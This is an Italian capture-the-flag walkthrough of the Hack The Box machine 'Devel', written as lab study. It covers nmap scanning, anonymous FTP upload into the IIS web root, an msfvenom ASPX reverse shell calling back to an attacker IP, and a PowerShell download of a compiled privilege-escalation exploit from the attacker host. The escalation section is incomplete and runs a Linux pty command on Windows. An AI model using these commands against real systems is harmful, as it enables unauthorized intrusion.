# Devel

## Reconnaissance

Per prima cosa eseguo una scansione iniziale con nmap.

```text
sudo nmap -sC -sV -O -oA /usr/share/nmap/initial 10.10.10.5
```

* **-sC**: scipt nmap di default
* **-sV**: per rilevare la versione dei servizi
* **-O**: per rilevare il SO
* **-oA**: per stampare tutti i formati e salvarli nel file _nmap/initial_

Il risultato della scansione è il seguente:

```text
Nmap scan report for 10.10.10.5
Host is up (0.040s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-syst:
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 03-18-17  01:06AM       <DIR>          aspnet_client
| 03-17-17  04:37PM                  689 iisstart.htm
|_03-17-17  04:37PM               184946 welcome.png
80/tcp open  http    Microsoft IIS httpd 7.5
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: IIS7
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|phone|specialized
Running (JUST GUESSING): Microsoft Windows 8|Phone|7|2008|Vista|8.1 (90%)
OS CPE: cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1 cpe:/o:microsoft:windows_8.1
Aggressive OS guesses: Microsoft Windows 8.1 Update 1 (90%), Microsoft Windows Phone 7.5 or 8.0 (90%), Microsoft Windows Embedded Standard 7 (89%), Microsoft Windows Server 2008 R2 (89%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (89%), Microsoft Windows 7 (89%), Microsoft Windows 7 Professional or Windows 8 (89%), Microsoft Windows Vista SP0 or SP1, Windows Server 2008 SP1, or Windows 7 (89%), Microsoft Windows Vista SP2 (89%), Microsoft Windows Vista SP2, Windows 7 SP1, or Windows Server 2008 (88%)
No exact OS matches for host (test conditions non-ideal).
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

## Enumeration
Dalla fase precedente scopro che è possibile accedere tramite ftp in modalità anonima:

<p align="center">
  <img src="/Immagini/Windows-Box/Devel/devel-2.png"/>
</p>

Successivamente, visito la pagina http://10.10.10.5/:

<p align="center">
  <img src="/Immagini/Windows-Box/Devel/devel-1.png"/>
</p>

Provo a navigare tra le pagine scoperte precedentemente e capisco che posso sfruttare il fatto che il server ftp si trova nella stessa root del server http.
Questo potrebbe permettere di ottenere una reverse shell mediante il semplice caricamento di un file tramite ftp.

Faccio una prova creando questo file _prova.html_:

```text
<html><body>PROVAAAAA</body></html>
```

Lo carico e vado sulla pagina http://10.10.10.5/prova.html:

<p align="center">
  <img src="/Immagini/Windows-Box/Devel/devel-3.png"/>
</p>

**Funziona!**

## Exploitation
Facendo una rapida ricerca scopro che il web server windows IIS versione 7.5 gira si basa su ASPX (ASP.NET). Quindi tramite _msfvenom_ genero il payload per la reverse-shell:

```text
msfvenom -p windows/shell_reverse_tcp -f aspx LHOST=10.10.14.9 LPORT=9999 -o reverse-shell.aspx
```

Avvio un listener sulla porta 9999 e visito la pagina http://10.10.10.5/reverse-shell.aspx:

<p align="center">
  <img src="/Immagini/Windows-Box/Devel/devel-4.png"/>
</p>

**Sono dentro!**

## Privilege Escalation
Purtroppo non ho accesso a nessuno degli account necessari per ottenere le flag.

Lancio il comando _systeminfo_:

<p align="center">
  <img src="/Immagini/Windows-Box/Devel/devel-5.png"/>
</p>

Scopro quindi che sopra c'è windows 7 e che non sono stati fatti aggiornamenti. Quindi vado alla ricerca di vulnerabilità da sfruttare per effettuare privilege escalation.

Tramite _searchsploit_ trovo uno exploit che fa quello che mi serve.

All'interno del file c'è il comando necessario per compilarlo. Per farlo occorre aver installato mingw-w64:

```text
i686-w64-mingw32-gcc 40564.c -o 40564.exe -lws2_32
```

Avvio un server python sulla porta 9444 e scarico il file appena creato nel seguente modo:

```text
powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.14.5:9444/40564.exe', 'c:\Users\Public\Downloads\40564.exe')"
```

Ottengo una shell migliore con questo comando:

```text
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

...


## Credits

...
